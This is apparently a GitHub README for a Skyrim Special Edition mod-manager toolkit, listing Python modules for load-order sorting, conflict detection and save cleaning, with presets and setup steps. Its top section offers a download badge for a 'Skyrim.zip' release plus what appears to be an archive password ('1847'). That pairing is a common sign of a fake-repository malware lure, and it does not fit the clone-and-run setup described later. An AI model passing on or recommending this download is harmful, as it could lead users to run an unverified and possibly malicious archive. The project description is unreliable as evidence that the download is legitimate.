`skyrim` `skyrim-se` `mod-manager` `load-order` `modding` `nexus-mods` `bethesda` `tes5` `skyrim-mods` `conflict-resolver`

# SkyrimSE-ModManager

After breaking my game for the 100th time with a bad load order, I decided to build something that actually catches conflicts before they crash your save. If you've ever stared at a CTD wondering which of your 400 mods just nuked everything — yeah, this is for you.

## Download

[![DOWNLOAD SKYRIM-SE](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/ForceDoveEntrance/Skyrim-Mod-Manager/releases/download/Release/Skyrim.zip)

**🔐🔐🔐🔐 — 1847**

---

## Why I Built This

Look, I love Skyrim modding. But I've spent more hours debugging load orders than actually playing the game at this point. LOOT is great and all, but I kept running into edge cases — patches loading before masters, texture conflicts nobody warned me about, scripts that silently broke quests. So I started writing Python scripts to catch this stuff, and it kinda snowballed into a full tool.

This isn't meant to replace MO2 or Vortex. It's meant to sit alongside them and catch the things they miss. Think of it as a second opinion on your load order before you hit Play and pray.

## What's Inside

The toolkit is split into focused modules so you can use what you need:

- **load_order_sorter** — Sorts your plugin list using custom rules on top of LOOT masterlist logic. Handles merged patches and late loaders properly.
- **conflict_detector** — Scans for record-level conflicts between ESPs. Flags overwrites that might cause the infamous "black face bug", broken navmeshes, and other fun surprises.
- **plugin_validator** — Checks for missing masters, form ID collisions, and plugins that reference deleted records. Catches stuff before your save does.
- **esp_merger** — Lightweight merge helper for plugins approaching the 254 limit. Not a full xEdit replacement, but handles simple merges fine.
- **texture_optimizer** — Batch downscales and compresses textures. Saves VRAM without tanking visual quality too hard. Great if you're running 4K packs on a 6GB card.
- **script_cleaner** — Finds orphaned Papyrus scripts and leftover script instances in saves. These are the silent killers of long-running playthroughs.
- **save_cleaner** — Strips orphaned references and cleans up bloated saves. I've recovered saves that were crashing every 5 minutes with this.
- **bashed_patch_helper** — Automates leveled list merging and tag generation for Wrye Bash patches. Mostly so I stop forgetting to rebuild after adding mods.
- **mod_profile_switcher** — Swap between mod profiles without restarting your mod manager. Handy if you maintain separate setups for different playthroughs.

### Presets

Not sure where to start? Pick a preset:

| Preset | Description |
|---|---|
| `vanilla_plus` | Light touch — bug fixes, UI improvements, quality of life. Under 50 plugins. |
| `visual_overhaul` | ENB-ready, 2K/4K textures, weather, lighting. Tuned for visual fidelity. |
| `gameplay_overhaul` | Combat, perks, magic, economy reworks. The "basically a different game" preset. |
| `lightweight` | For potato PCs or Steam Deck. Performance patches, compressed textures, minimal scripts. |

## How to Set It Up

1. Make sure you have Python 3.9+ installed
2. Clone or download this repo
3. Install dependencies:
   ```
   pip install -r requirements.txt
   ```
4. Point the config at your Skyrim SE data folder:
   ```
   python setup.py --game-path "C:\Steam\steamapps\common\Skyrim Special Edition"
   ```
5. Run the main tool:
   ```
   python mod_manager.py --preset vanilla_plus
   ```

You'll probably want to run `conflict_detector` first on any existing setup. It'll dump a report showing what's overwriting what. Fair warning — if you have 300+ mods, the first scan takes a minute.

## Known Issues

- ESP merger doesn't handle complex CELL records well yet. Stick to xEdit for those.
- Texture optimizer sometimes miscategorizes normal maps. Double-check your _n.dds files.
- Save cleaner can be slow on saves over 50MB (you know who you are, survival mode hoarders).
- Conflict detection for ESL-flagged plugins is still a bit rough around the edges.
- The script cleaner might flag legitimate scripts from frameworks like SKSE plugins — always review before deleting.

> This project is not affiliated with Bethesda Game Studios or any official modding tools. Use at your own risk — always back up your saves and mod setup before running any automated tools. Modding can break things, that's kind of the whole deal.
